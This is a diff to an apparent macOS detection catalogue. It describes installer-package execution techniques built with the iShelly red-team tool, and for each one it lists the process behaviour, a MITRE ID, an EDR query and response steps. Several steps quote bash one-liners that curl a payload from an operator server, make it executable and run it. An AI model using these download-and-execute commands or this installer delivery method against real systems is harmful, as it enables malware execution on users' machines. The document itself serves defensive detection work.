@@ -68,8 +68,30 @@ Commands:
       - Step: Installer prompts the user with subject "This package will run a program to determine if the software can be installed".
       - Step: xpcproxy magic happens, and launchd executes InstallerRemotePluginService-x86_64 as user.
       - Step: InstallerRemotePluginService-x86_64 then launches the script interpreter as a user. In our case this will be bash (since this is how iShelly implements this vector). The cmdline is <pre><code>/bin/bash -c /usr/bin/curl -k 'http://127.0.0.1:3391/payloads/d2526ae26fc2139263f57c2af445004e385772ec/operator-payload' -o /Users/$USER/Library/Application\\ Support/operator-payload; chmod +x /Users/$USER/Library/Application\\ Support/operator-payload; /Users/$USER/Library/Application\\ Support/operator-payload -name installer-plugin & </pre></code>
-      - Step: as a result of the above bash one liner, bash executes the following children processes- curl, chmod, operator-payload.
+      - Step: as a result of the above bash one liner, bash executes the following children processes- curl, chmod. curl makes a network connection to Operator and writes payload to /Users/$USER/Library/Application\ Support/operator-payload. chmod makes the payload executable.
+      - Step: The same bash process executes operator-payload.
       - Step: operator-payload makes a network connection to operator.
+    Execute:
+      - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with the "Installer Package w/ Installer Plugin" Installer Package option.
+    Detect:
+      - EDR: process_name = "InstallerRemotePluginService-x86_64"
+    Respond:
+      - Step: Review the children of process InstallerRemotePluginService.
+      - Step: Review process creations, network connections and file writes of all children processes of InstallerRemotePluginService.
+
+  - Name: Installer Package w/ JavaScript Functionality embedded
+    Description: This query detects installer packages leveraging JavaScript functionality via distribution.xml files.
+    Usecase: Adversaries may pair this technique with a social engineering component to execute malware. Adversaries may use this technique to generate less known EDR behavioral patterns or when they need malware running as user.
+    Category: Execution
+    Privileges: User
+    MitreID: T1204.002
+    Behaviors:
+      - Step: When executing the pkg file generated via <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a>, launchd runs Installer as user.
+      - Step: Installer prompts the user with subject "This package will run a program to determine if the software can be installed".
+      - Step: Installer launches bash process with cmdline <pre><code>/bin/bash -c /usr/bin/curl -k 'http://127.0.0.1:3391/payloads/d2526ae26fc2139263f57c2af445004e385772ec/operator-payload' -o /Users/$USER/Library/Application\\ Support/operator-payload </pre></code>
+      - Step: bash launches curl which makes a network connection to Operator and writes payload to /Users/anadrowski/Library/Application Support/operator-payload.
+      - Step: The same Installer process launches a new bash process with cmdline <pre><code>/bin/bash -c chmod +x /Users/$USER/Library/Application\\ Support/operator-payload </pre></code> to make the payload executable.
+      - Step: The same Installer process launches a new bash process with cmdline <pre><code>/bin/bash -c /Users/$USER/Library/Application\\ Support/operator-payload -name installer-js-embedded & </pre></code> to execute the payload.
     Execute:
       - Prelude Operator: Run <a href="https://github.com/AutomoxSecurity/iShelly">iShelly</a> with the "Installer Package w/ Installer Plugin" Installer Package option.
     Detect:
